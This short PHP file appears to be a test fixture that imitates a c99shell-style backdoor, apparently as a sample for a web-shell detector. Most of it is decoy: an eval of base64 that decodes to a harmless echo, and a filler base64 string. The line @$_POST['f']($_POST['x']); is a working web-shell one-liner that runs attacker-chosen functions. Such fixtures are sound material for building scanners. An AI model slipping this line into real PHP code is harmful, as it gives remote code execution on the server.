<?php
// c99shell style backdoor (fixture for tests only)
eval(base64_decode('ZWNobyAiaGVsbG8iOw=='));
@$_POST['f']($_POST['x']);
$data = base64_decode("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ekFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=");
echo "php2shell loaded";
